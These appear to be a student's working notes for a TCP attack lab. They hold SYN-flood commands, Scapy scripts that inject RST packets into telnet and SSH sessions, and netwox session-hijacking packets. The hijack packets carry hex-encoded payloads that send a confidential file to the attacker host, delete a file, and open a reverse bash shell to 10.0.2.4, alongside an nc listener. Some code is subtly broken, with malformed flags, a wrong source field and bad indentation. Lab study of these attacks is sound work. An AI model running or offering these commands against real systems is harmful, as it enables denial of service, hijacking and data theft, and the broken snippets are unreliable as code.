$ sudo netwox number [parameters ... ]

sudo sysctl -q net.ipv4.tcp_max_syn_backlog
netstat -na | grep -c 'ESTABLISHED'
netstat -na | grep -c 'SYN_RECV'

sudo sysctl -a | grep cookie
sudo sysctl -w net.ipv4.tcp_syncookies=0
sudo sysctl -w net.ipv4.tcp_syncookies=1


Title: Synflood
Usage: netwox 76 -i 10.0.2.5 -p port [-s spoofip]
Parameters:
-i|--dst-ip ip destination IP address
-p|--dst-port port destination port number
-s|--spoofip spoofip IP spoof initialzation type

netwox 76 -i 10.0.2.5 -p 80



netwox 78 -d device -f filter -s spoofip

Parameters:
-d|--device device device name {Eth0}
-f|--filter filter pcap filter
-s|--spoofip spoofip IP spoof initialization type {linkbraw}

sudo netwox 78 -d device -f filter -s spoofip

sudo netwox 78 -d enp0s3 -f "net 10.0.2.6" -s linkbraw

attacker:10.0.2.4 
victim : 10.0.2.5
server : 10.0.2.6

Telnet
	telnet 10.0.2.6 23

SSH
	ssh 10.0.2.6

	sudo netwox 78 -d enp0s3 -f "net 10.0.2.6" -s linkbraw


#!/usr/bin/python
from scapy.all import *

src='10.0.2.5'
dst='10.0.2.6'
dst_port='23'

ip = IP(src=src, dst=dst)
tcp = TCP(sport=80, dport=dst_port, flags="R", seq=1000, ack=1001)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

---------------------------------

#!/usr/bin/python
from scapy.all import *

def func_RST(pkt):
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport,
	flags=SYN/PSH, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
	pkt = ip/tcp
	send(pkt,verbose=0)

pkt=sniff(filter='host 10.0.2.5 and host 10.0.2.6 and port 22',prn=func_RST)




#!/usr/bin/python
from scapy.all import *

def func_RST(pak):
	ip = IP(src=pak[IP].dst, dst=pak[IP].src)
	tcp = TCP(sport=pak[TCP].dport, dport=pak[TCP].sport, flags="RA", seq=pak[TCP].ack, ack=pak[TCP].seq+1)
	pak = ip/tcp
	send(pak,verbose=0)

pak=sniff(filter='host 10.0.2.5 and host 10.0.2.6 and port 22',prn=func_RST)



---------------------------------------------------------------
TASK 4

netwox 40

attacker: 10.0.2.4 
victim 	: 10.0.2.5
server 	: 10.0.2.6

netwox 40 --ip4-src 10.0.2.10 --ip4-dst 10.0.2.8 --ip4-ttl 64
 --tcp-dst 23 --tcp-src 3298
--tcp-seqnum 498442992 --tcp-window 237 --tcp-acknum 3050751657
--tcp-urg --tcp-ack --tcp-psh --tcp-data "HEX"

========================================
sudo netwox 40 -l 10.0.2.5 -j 64 -m 10.0.2.6 -o 51560 -p 23 -q 3195023860 -r 1373358937 -z -A -E 227 -H '0a636174202f686f6d652f736565642f7365727665722f636f6e666964656e7469616c203e202f6465762f7463702f31302e302e322e342f34343434200a'
========================================

sudo netwox 40 -e 31040 -j 64 -l 10.0.2.6 -m 10.0.2.7 -p 23 -q 742261223 -r 2783844 -z -A -E 245 -H '0a636174202f686f6d652f736565642f6369706865722e747874203e202f6465762f7463702f31302e302e
322e352f393039300a'
# -e --ip4-id = pkt[IP].id+1
# -j --ip4-ttl = 64, default for linux
# -l --ip4-src = fake src
# -m --ip4-dst = true victim
# -o --tcp-src = pkt[TCP].sport
# -p --tcp-dst = pkt[TCP].dport
# -q --tcp-seqnum = pkt[TCP].seq
# -r --tcp-acknum = pkt[TCP].ack
# -z --tcp-ack = set
# -A --tcp-psh = set
# -E --tcp-window = 245, according to a real sample
# -H --tcp-data = the command





0d746f756368202f686f6d652f736565642f76697275735f66696c650d

"\ncat /home/seed/server/confidential > /dev/tcp/10.0.2.4/4444 \n".encode("hex")
0a636174202f686f6d652f736565642f7365727665722f636f6e666964656e7469616c203e202f6465762f7463702f31302e302e322e342f34343434200a




#!/usr/bin/python
from scapy.all import *

def func_4(pak):
	key = pak[IP].dst
	if key not in dest_record:
		dest_record[key] = 0
		return
	else:
		if dest_record[key] < 0: # prior victim
		return
	if dest_record[key] <= 50: # wait for logging
		dest_record[key] += 1
		return
	if 4*pak[IP].ihl+4*pak[TCP].dataofs != pak[IP].len: # exist content
		return
	else:
		dest_record[key] = -1 # attack

	ip = IP(src=pak[IP].id+1, dst=pak[IP].src)
	tcp = TCP(sport=pak[TCP].dport, dport=pak[TCP].sport, flags=0x18, seq=pak[TCP].ack, ack=pak[TCP].seq)
	data = Raw(load='\r\nrm /home/seed/server/confidential\n')
	pak = ip/tcp/data
	ls(pak)
	send(pak,verbose=0)
	print("you were attacked")

pak = sniff(filter='dst port 23', prn=func_4)



listening to a server
nc -l 9090 -v


/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1

attacker:10.0.2.4 
victim : 10.0.2.5
server : 10.0.2.6


sudo netwox 40 -l 10.0.2.5 -j 64 -m 10.0.2.6 -o 51572 -p 23 -q 1531254437 -r 2459762528 -z -A -E 237 -H '0d0d2f62696e2f62617368202d69203e202f6465762f7463702f31302e302e322e342f3930393020303c263120323e26310d'
========================================
# -e --ip4-id = pkt[IP].id+1
# -j --ip4-ttl = 64, default for linux
# -l --ip4-src = fake src
# -m --ip4-dst = true victim
# -o --tcp-src = pkt[TCP].sport
# -p --tcp-dst = pkt[TCP].dport
# -q --tcp-seqnum = pkt[TCP].seq
# -r --tcp-acknum = pkt[TCP].ack
# -z --tcp-ack = set
# -A --tcp-psh = set
# -E --tcp-window = 245, according to a real sample
# -H --tcp-data = the command


"\r\r/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1\r".encode("hex")
0d0d2f62696e2f62617368202d69203e202f6465762f7463702f31302e302e322e342f3930393020303c263120323e26310d